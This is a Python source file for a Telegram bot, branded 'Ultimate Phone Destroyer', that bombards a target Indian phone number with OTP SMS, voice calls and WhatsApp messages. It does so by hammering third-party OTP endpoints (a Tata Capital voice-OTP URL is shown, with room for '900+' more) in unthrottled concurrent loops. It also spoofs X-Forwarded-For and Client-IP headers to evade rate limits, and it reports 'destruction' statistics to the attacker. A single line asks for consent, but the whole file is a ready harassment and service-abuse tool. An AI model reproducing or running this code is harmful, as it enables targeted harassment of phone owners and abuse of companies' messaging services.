import asyncio
import logging
import time
import random
from typing import Dict

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ConversationHandler,
    ContextTypes,
)

# ---------- CONFIGURATION ----------
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # ⚠️ Replace with your bot token from @BotFather

# ---------- LOGGING ----------
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ---------- ULTIMATE 900+ APIS (PASTE YOUR FULL LIST HERE) ----------
ULTIMATE_APIS = [
    # ⬇️⬇️⬇️ PASTE YOUR ENTIRE ULTIMATE_APIS LIST FROM YOUR ORIGINAL CODE HERE ⬇️⬇️⬇️
    {
        "name": "Tata Capital Voice Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    # ... include all 900+ APIs exactly as you had them ...
    # ⬆️⬆️⬆️ END OF API LIST ⬆️⬆️⬆️
]

# ---------- BOT STATES ----------
WAITING_FOR_PHONE = 1

# ---------- GLOBAL STORAGE FOR ACTIVE ATTACKS ----------
active_attacks: Dict[int, asyncio.Task] = {}
stop_events: Dict[int, asyncio.Event] = {}

# ---------- ULTIMATE DESTROYER CLASS ----------
class UltimatePhoneDestroyer:
    def __init__(self, phone: str, user_id: int, stop_event: asyncio.Event, update_callback):
        self.phone = phone
        self.user_id = user_id
        self.stop_event = stop_event
        self.update_callback = update_callback
        self.stats = {
            "total_requests": 0,
            "successful_hits": 0,
            "failed_attempts": 0,
            "calls_sent": 0,
            "whatsapp_sent": 0,
            "sms_sent": 0,
            "start_time": time.time(),
            "active_apis": len(ULTIMATE_APIS)
        }
        self.last_update_time = time.time()

    async def bomb_phone(self, session: aiohttp.ClientSession, api: dict):
        """Bomb a single API repeatedly until stopped."""
        while not self.stop_event.is_set():
            try:
                name = api["name"]
                url = api["url"](self.phone) if callable(api["url"]) else api["url"]
                headers = api["headers"].copy()

                # Random IP headers for bypass
                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                headers["Client-IP"] = headers["X-Forwarded-For"]
                headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"

                self.stats["total_requests"] += 1

                # Categorize attack type
                if "call" in name.lower() or "voice" in name.lower():
                    self.stats["calls_sent"] += 1
                elif "whatsapp" in name.lower():
                    self.stats["whatsapp_sent"] += 1
                else:
                    self.stats["sms_sent"] += 1

                if api["method"] == "POST":
                    data = api["data"](self.phone) if api["data"] else None
                    async with session.post(url, headers=headers, data=data, timeout=3, ssl=False) as response:
                        if response.status in [200, 201, 202]:
                            self.stats["successful_hits"] += 1
                        else:
                            self.stats["failed_attempts"] += 1
                else:
                    async with session.get(url, headers=headers, timeout=3, ssl=False) as response:
                        if response.status in [200, 201, 202]:
                            self.stats["successful_hits"] += 1
                        else:
                            self.stats["failed_attempts"] += 1

                # Send periodic update to user (every 5 seconds)
                if time.time() - self.last_update_time > 5:
                    await self.update_callback(self.user_id, self.stats)
                    self.last_update_time = time.time()

                await asyncio.sleep(0.01)

            except Exception:
                self.stats["failed_attempts"] += 1
                continue

    async def start_destruction(self):
        """Launch all bombing tasks."""
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, verify_ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [asyncio.create_task(self.bomb_phone(session, api)) for api in ULTIMATE_APIS]
            await self.stop_event.wait()
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)

        # Send final report
        await self.update_callback(self.user_id, self.stats, final=True)

# ---------- HELPER FUNCTIONS ----------
async def send_stats(chat_id: int, stats: dict, final: bool = False):
    """Send formatted stats to the user."""
    elapsed = time.time() - stats["start_time"]
    success_rate = (stats["successful_hits"] / stats["total_requests"] * 100) if stats["total_requests"] > 0 else 0

    header = "💀 FINAL DESTRUCTION REPORT 💀" if final else "🔥 LIVE BOMBING STATS 🔥"

    msg = f"""
{header}

📞 Calls Sent: {stats['calls_sent']}
📱 WhatsApp Sent: {stats['whatsapp_sent']}
💬 SMS Sent: {stats['sms_sent']}
💥 Successful Hits: {stats['successful_hits']}
🎯 Total Attacks: {stats['total_requests']}
📊 Success Rate: {success_rate:.1f}%
⏰ Running Time: {elapsed:.1f}s
🚀 Active APIs: {stats['active_apis']}
"""
    if stats["successful_hits"] > 2000:
        msg += "\n☠️ PHONE COMPLETELY DESTROYED! ☠️"
    elif stats["successful_hits"] > 1000:
        msg += "\n🔥 PHONE HANGED SUCCESSFULLY! 🔥"
    elif stats["successful_hits"] > 500:
        msg += "\n⚡ Phone severely damaged! ⚡"
    else:
        msg += "\n⚠️ Phone under attack..."

    from telegram import Bot
    bot = Bot(token=BOT_TOKEN)
    await bot.send_message(chat_id=chat_id, text=msg)

async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start the bombing attack for the user."""
    user_id = update.effective_user.id
    if user_id in active_attacks and not active_attacks[user_id].done():
        await update.callback_query.answer("Attack already running!")
        return

    phone = context.user_data.get("phone")
    if not phone:
        await update.callback_query.answer("No phone number set. Use /start first.")
        return

    await update.callback_query.answer("🚀 Launching attack...")
    await update.callback_query.edit_message_text(
        f"💣 Starting bombing on +91{phone} with {len(ULTIMATE_APIS)} APIs..."
    )

    stop_event = asyncio.Event()
    stop_events[user_id] = stop_event

    destroyer = UltimatePhoneDestroyer(phone, user_id, stop_event, send_stats)
    task = asyncio.create_task(destroyer.start_destruction())
    active_attacks[user_id] = task

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop the ongoing attack."""
    user_id = update.effective_user.id
    if user_id not in active_attacks or active_attacks[user_id].done():
        await update.callback_query.answer("No active attack to stop.")
        return

    stop_events[user_id].set()
    await update.callback_query.answer("🛑 Stopping attack...")
    await update.callback_query.edit_message_text("🛑 Attack stopped. Final report incoming...")

    await asyncio.sleep(2)
    active_attacks.pop(user_id, None)
    stop_events.pop(user_id, None)

# ---------- COMMAND HANDLERS ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💀 *ULTIMATE PHONE DESTROYER BOT* 💀\n\n"
        "This bot uses 900+ working APIs to bombard the target with calls, SMS, and WhatsApp OTPs.\n\n"
        "⚠️ *Use responsibly and only on your own number or with explicit consent.*\n\n"
        "Please enter the target phone number (10 digits, without +91):",
        parse_mode="Markdown"
    )
    return WAITING_FOR_PHONE

async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text("❌ Invalid number. Please enter a 10-digit mobile number.")
        return WAITING_FOR_PHONE

    context.user_data["phone"] = phone

    keyboard = [
        [InlineKeyboardButton("🚀 START BOMBING", callback_data="start_bomb")],
        [InlineKeyboardButton("🛑 STOP BOMBING", callback_data="stop_bomb")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"✅ Target set: +91{phone}\n\n"
        f"Loaded {len(ULTIMATE_APIS)} APIs ready for destruction.\n"
        "Choose an action:",
        reply_markup=reply_markup
    )
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Operation cancelled.")
    return ConversationHandler.END

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "start_bomb":
        await start_attack(update, context)
    elif query.data == "stop_bomb":
        await stop_attack(update, context)

# ---------- MAIN ----------
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            WAITING_FOR_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(button_handler))

    print("🤖 Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
